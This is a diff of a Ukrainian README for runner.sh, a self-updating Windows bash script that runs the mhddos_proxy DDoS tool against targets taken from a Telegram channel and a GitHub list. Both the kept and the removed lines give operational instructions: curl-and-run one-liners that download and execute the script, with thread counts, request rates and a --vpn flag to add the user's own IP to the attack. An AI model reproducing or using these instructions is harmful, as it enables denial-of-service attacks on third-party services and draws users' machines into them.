@@ -1,9 +1,7 @@
 # Опис runner_for_windows
 
 runner.sh - ПОВНІСТЮ АВТООНОВЛЮВАНИЙ (оновлює цілі та себе) bash-скрипт для Windows-машин, що керує [mhddos_proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy)  
-Також він автоматично оновлює не лише свій скрипт та цілі, а й сам скрипт mhddos_proxy  
 Також скрипт імітує роботу людини (вимикає увесь ДДоС на 1-2 (рандомно) хвилин), щоб дати машині трохи відпочити
-Скрипт розподіляє ваші машини по цілям: https://github.com/alexnest-ua/targets/blob/main/targets_linux (цілі беруться звідси: https://t.me/ddos_separ)  
   
 [**Варіант для Mac**](https://github.com/alexnest-ua/auto_mhddos_mac)  
 [**Варіант для Linux**](https://github.com/alexnest-ua/auto_mhddos_alexnest/tree/main)  
@@ -17,9 +15,6 @@ runner.sh - ПОВНІСТЮ АВТООНОВЛЮВАНИЙ (оновлює ці
   
 [**Налаштування**](#%D0%BD%D0%B0%D0%BB%D0%B0%D1%88%D1%82%D1%83%D0%B2%D0%B0%D0%BD%D0%BD%D1%8F-%D0%B2%D1%81%D1%82%D0%B0%D0%BD%D0%BE%D0%B2%D0%BB%D0%B5%D0%BD%D0%BD%D1%8F)  
 [**Запуск атаки**](#%D0%B7%D0%B0%D0%BF%D1%83%D1%81%D0%BA-%D0%B0%D1%82%D0%B0%D0%BA%D0%B8)  
-[**Приклади команд з --debug та без**](#%D0%BF%D1%80%D0%B8%D0%BA%D0%BB%D0%B0%D0%B4%D0%B8-%D0%BA%D0%BE%D0%BC%D0%B0%D0%BD%D0%B4-%D0%B7-%D1%80%D1%96%D0%B7%D0%BD%D0%B8%D0%BC%D0%B8-%D0%BF%D0%B0%D1%80%D0%B0%D0%BC%D0%B5%D1%82%D1%80%D0%B0%D0%BC%D0%B8)  
-
-
 
   
 Канал, де координуються цілі: https://t.me/ddos_separ (звідти і беруться сюди цілі, тому якщо у вас на Windows запущено цей скрипт - то можете відповчивати, він все зробить за вас)  
@@ -47,86 +42,7 @@ curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/r
 ```
 * Буде запущено атаку з параметрами за замовчуванням в залежності від кількості ядер вашого ПК
 
-Тепер кожні 5 хвилин воно буде оновлювати список проксі, а кожні 20 хвилин - цілі атаки та перевіряти наявність оновлення (та встановлювати його якщо воно є)  
+Тепер воно буде автоматично оновлювати список проксі, цілі атаки та перевіряти наявність оновлення (та встановлювати його якщо воно є)  
 
 **Далі можна просто ЗГОРНУТИ вікно і воно буде працювати нескінченно в фоні**  
 ***щоб зупинити процес - натисніть Ctrl+C (або якщо не спрацює просто закрийте вікно з атакою)***  
-
-**!!!УВАГА!!!** runner.sh підтримує наступні параметри (САМЕ У ТАКОМУ ПОРЯДКУ ТА ЛИШЕ У ТАКІЙ КІЛЬКОСТІ(мінімум 3)), але можно і без них:  
-`curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh [num_of_copies] [threads] [rpc] [debug] [vpn]`  
-- num_of_copies - кількість копій атаки (але не менше 1, та не більше 4, бо більше 4-ох знижує ефективність)
-- threads - кількість потоків (але не менше 2500, та не більше 5000 для одного ядра, не більше 10000 для 2-4 ядер, не більше 15000 для 4+ ядер)
-- rpc - кількість запитів на проксі перед відправкою на ціль (але не менше 1000, та не більше 3000)
-- debug - можливість дебагу (якщо хочете бачити повний інфу по атаці - у 4-ий параметр додайте --debug)
-- vpn - використання вашого ІР у атаці разом з проксі
-  
-### Приклади команд з різними параметрами:
-  
-Команди обовязково потрібно вводити в програмі Git Bash  
-  
-  
-1. ***Для лінивих*** (буде запущено з параметрами за замовчуванням в залежності від кількості ядер вашого ПК)  
-```shell
-curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh
-```
-  
-**CPUs** - це ядра вашого процесора - зазвичай ядер у два рази менше ніж потоків 
-  
-2. Слаба машина(1 CPU), саме ці параметри за замовчуванням:
-```shell
-curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh 1 2500 1000
-```
-
-3. Середня машина(2-4 CPUs):
-```shell
-curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh 1 6000 2000
-```
-
-4. Нормальна машина(4-8 CPUs):
-```shell
-curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh 2 7500 2500
-```
-
-5. Потужна машина(9+ CPUs):
-```shell
-curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh all 7500 3000
-```
-
-  
-*також ви можете змінювати параметри на будь-які інші значення, але я рекомендую саме ці.*  
-  
-* також можете додавати **4-тим** параметром --debug, що слідкувати за ходом атаки, та **5-тим** параметром --vpn, щоб атакувати ще й через свій ІР разом з проксі, наприклад:  
-```shell
-curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh 1 2500 1000 --debug --vpn
-```
-* або якщо хочете лише `--vpn` без `--debug`, можна запустити ось так:
-```shell
-curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh 1 2500 1000 --vpn
-```
-  
-* Приклад **БЕЗ** параметру --debug:  
-![image](https://user-images.githubusercontent.com/74729549/168058965-1116eb6a-6fc4-45d5-b2a8-eb7f5529ab87.png)  
-***наступні 5 хвилин буде виводитись лише інформація від proxy_finder про пошук проксі, але атака теж йде паралельно!***  
-* Приклад **З** параметрами --debug та --vpn:  
-![image](https://user-images.githubusercontent.com/74729549/168068441-0be60ba6-49c7-41de-a89c-c50410a50fef.png)  
-  
-  
-  
-Далі кожні 5 хвилин воно буде оновлювати список проксі, а кожні 20 хвилин - цілі атаки та перевіряти наявність оновлення (та встановлювати його якщо воно є)  
-  
-  
-
-* ***щоб зупинити процес - натисніть Ctrl+C (або якщо не спрацює просто закрийте вікно з атакою)***    
-
-УВАГА!!! Скрипт при рестарті (кожні 20 хвилин) вбиває запущені скрипти саме з mhddos_proxy, тому якщо запускаєте цей скрипт на Windows-машині, то свої атаки mhddos_proxy запускайте на [іншій машині](https://auto-ddos.notion.site/dd91326ed30140208383ffedd0f13e5c)
-
-
-## Список цілей  
-
-  
-runner.sh підтримує единий [список цілей](https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux), який можна тримати на github і постійно оновлювати.  
-  
-  
-  
-Цілі не обов'язково видаляти із списку. Їх можна просто закоментувати і розкоментувати пізніше, якщо вони знов знадобляться. Скрипт використовує лише строки, які починаються не на #.  
-#test1
